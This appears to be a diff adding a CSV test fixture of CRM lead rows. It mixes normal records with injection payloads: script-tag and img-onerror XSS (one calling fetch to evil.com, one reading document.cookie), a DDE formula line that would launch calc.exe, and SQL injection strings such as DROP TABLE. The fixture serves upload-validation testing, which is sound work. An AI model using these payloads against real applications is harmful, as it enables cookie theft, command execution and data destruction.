@@ -1,0 +1,11 @@
+name,email,mobile_without_country_code,city,crm_status,data_source
+<script>alert("XSS via name")</script>,safe@example.com,9820000001,Delhi,SALE_DONE,leads_on_demand
+Safe User,safe@example.com,=cmd|'/c calc.exe'!,Mumbai,GOOD_LEAD_FOLLOW_UP,meridian_tower
+Injection Test,inject@test.com,9820000002,Bangalore,DROP TABLE leads; --,eden_park
+Bad Status Row,bad@example.com,9820000003,Chennai,SUPER_HOT_LEAD,varah_swamy
+Bad Source Row,bad2@example.com,9820000004,Pune,GOOD_LEAD_FOLLOW_UP,facebook_campaign
+<img src=x onerror=fetch('http://evil.com')>,img@xss.com,9820000005,Jaipur,DID_NOT_CONNECT,sarjapur_plots
+Normal Row,ok@example.com,9820000006,Kolkata,SALE_DONE,leads_on_demand
+' OR '1'='1,union@sql.com,9820000007,Surat,BAD_LEAD,meridian_tower
+@SUM(1+1),formula@test.com,9820000008,Nagpur,GOOD_LEAD_FOLLOW_UP,leads_on_demand
+<script>document.cookie</script>,cookie@xss.com,9820000009,Coimbatore,DID_NOT_CONNECT,eden_park
